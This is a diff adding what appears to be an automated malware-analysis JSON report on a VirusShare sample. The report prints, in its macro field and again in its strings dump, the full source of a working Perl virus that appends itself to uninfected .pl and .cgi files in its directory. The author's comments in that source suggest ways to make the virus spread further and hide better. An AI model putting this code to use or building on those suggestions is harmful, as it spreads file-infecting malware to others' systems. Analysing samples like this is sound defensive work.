@@ -1,0 +1,86 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "kill": "May delete a file",
+            "open": "May open a file",
+            "write": "May write to a file"
+        },
+        "macro": "#!/usr/bin/perl\n\n## About the Perl Virus\n# I didn't make it for any reason other than I can, I was reading \"Learn Perl in 21 Days\" and\n# it looked so easy to make a Perl virus (however limited it may be :), it took about 30 minutes\n# to make, and 10 of those were spent at perl.com looking for a way to get the program's name\n# ($0 does it). \n\n# This virus is pathetic, even if it ever makes it out of \"the lab\", people can see \n# it just by looking through their programs, and they can remove it with any text editor. :) Also\n# the files it can spread to have to be writable, although I think I could make a new version that\n# also changes the file permissions so that it can write to any file. The biggest flaw with this\n# program right now is that it only checks the directory it's in, this is because I DON'T want the\n# program to infect all my other programs. :) Some other improvements you should make to turn this\n# into a better virus would be to use shorter variable names, kill the comments, and use less text \n# identifying the start and end of the program.\n\n# Check http://www.macman.net for new versions and other cool stuff\n# Let me know if you build on this, or have the source to any other virii (no assembly!!),\n# you can send it to macman@macman.net\n\n\t\n## Perl Virus Begins Now ##\n\topendir(DIR, \".\"); #open the directory this program is in\n\t@FILES = readdir(DIR); #get the file names\n\tclosedir(DIR);\n\t\n\t## Look for programs to spread to (limited to the current directory for now)\n\tfor ($i = 0; $i < @FILES; $i++) {\n\t\tif (substr($FILES[$i], length($FILES[$i]) - 4) eq \".cgi\" || substr($FILES[$i], length($FILES[$i]) - 3) eq \".pl\") {\n\t\t\t$TARGETS[$ii] = $FILES[$i];\n\t\t\t$ii++;\n\t\t}\n\t}\n\t\n\t## Check if the file is already infected\n\tfor ($i = 0; $i < @TARGETS; $i++) {\n\t\topen(FILE,$TARGETS[$i]);\n\t\t$file = join(\"\",<FILE>);\n\t\tclose(FILE);\n\t\tif (index($file, \"## Perl Virus Begins Now ##\") == -1) { ##the file isn't infected, INFECT IT!! (append to it)\n\t\t\tif ($me eq \"\") { #what we want to write hasn't been copied yet, this is a considerate virus, it could just keep copying itself each time and slow your computer down (and become a couple hundred bytes smaller)...\n\t\t\t\topen(me,$0); #opens THIS program\n\t\t\t\t$me = join(\"\",<me>);\n\t\t\t\t$start = index($me,\"## Perl Virus Begins Now ##\");\n\t\t\t\t$me = substr($me, $start, rindex($me,\"## Perl Virus Ends Now##\") + 24 - $start);\n\t\t\t\tclose(me);\n\t\t\t}\n\t\t\topen(FILE,\">>$TARGETS[$i]\");\n\t\t\tprint FILE $me;\n\t\t\tclose(FILE);\n\t\t}\n\t}\n\tclosedir(DIR);\n## Perl Virus Ends Now##\n\n\n\n## For testing...\n##print \"Content-type: text/html\\n\\n\"; \t##so web browsers see it\n##Print all the files we can infect :)\n#for ($i = 0; $i <  @TARGETS; $i++) {\t\n#\t print $TARGETS[$i] . \"<BR>\\n\";\n#}"
+    },
+    "filename": "VirusShare_2a6e156b0f282d9148b0a3868a34d3bd",
+    "filesize": 2714,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "2a6e156b0f282d9148b0a3868a34d3bd",
+        "sha1": "7f0c57580a190c48a98ed71dd87f21282fe08134",
+        "sha256": "516c5ad61cb01ed37a65500f0a10b3d1f078bd1ce74aef9f33668e80b85c35cb"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "## About the Perl Virus",
+            "# I didn't make it for any reason other than I can, I was reading \"Learn Perl in 21 Days\" and",
+            "# it looked so easy to make a Perl virus (however limited it may be :), it took about 30 minutes",
+            "# to make, and 10 of those were spent at perl.com looking for a way to get the program's name",
+            "# ($0 does it). ",
+            "# This virus is pathetic, even if it ever makes it out of \"the lab\", people can see ",
+            "# it just by looking through their programs, and they can remove it with any text editor. :) Also",
+            "# the files it can spread to have to be writable, although I think I could make a new version that",
+            "# also changes the file permissions so that it can write to any file. The biggest flaw with this",
+            "# program right now is that it only checks the directory it's in, this is because I DON'T want the",
+            "# program to infect all my other programs. :) Some other improvements you should make to turn this",
+            "# into a better virus would be to use shorter variable names, kill the comments, and use less text ",
+            "# identifying the start and end of the program.",
+            "# Check http://www.macman.net for new versions and other cool stuff",
+            "# Let me know if you build on this, or have the source to any other virii (no assembly!!),",
+            "# you can send it to macman@macman.net",
+            "## Perl Virus Begins Now ##",
+            "\topendir(DIR, \".\"); #open the directory this program is in",
+            "\t@FILES = readdir(DIR); #get the file names",
+            "\tclosedir(DIR);",
+            "\t## Look for programs to spread to (limited to the current directory for now)",
+            "\tfor ($i = 0; $i < @FILES; $i++) {",
+            "\t\tif (substr($FILES[$i], length($FILES[$i]) - 4) eq \".cgi\" || substr($FILES[$i], length($FILES[$i]) - 3) eq \".pl\") {",
+            "\t\t\t$TARGETS[$ii] = $FILES[$i];",
+            "\t\t\t$ii++;",
+            "\t## Check if the file is already infected",
+            "\tfor ($i = 0; $i < @TARGETS; $i++) {",
+            "\t\topen(FILE,$TARGETS[$i]);",
+            "\t\t$file = join(\"\",<FILE>);",
+            "\t\tclose(FILE);",
+            "\t\tif (index($file, \"## Perl Virus Begins Now ##\") == -1) { ##the file isn't infected, INFECT IT!! (append to it)",
+            "\t\t\tif ($me eq \"\") { #what we want to write hasn't been copied yet, this is a considerate virus, it could just keep copying itself each time and slow your computer down (and become a couple hundred bytes smaller)...",
+            "\t\t\t\topen(me,$0); #opens THIS program",
+            "\t\t\t\t$me = join(\"\",<me>);",
+            "\t\t\t\t$start = index($me,\"## Perl Virus Begins Now ##\");",
+            "\t\t\t\t$me = substr($me, $start, rindex($me,\"## Perl Virus Ends Now##\") + 24 - $start);",
+            "\t\t\t\tclose(me);",
+            "\t\t\t}",
+            "\t\t\topen(FILE,\">>$TARGETS[$i]\");",
+            "\t\t\tprint FILE $me;",
+            "\t\t\tclose(FILE);",
+            "\tclosedir(DIR);",
+            "## Perl Virus Ends Now##",
+            "## For testing...",
+            "##print \"Content-type: text/html\\n\\n\"; \t##so web browsers see it",
+            "##Print all the files we can infect :)",
+            "#for ($i = 0; $i <  @TARGETS; $i++) {\t",
+            "#\t print $TARGETS[$i] . \"<BR>\\n\";"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.macman.net"
+        ]
+    },
+    "time": "0:00:00.279709",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
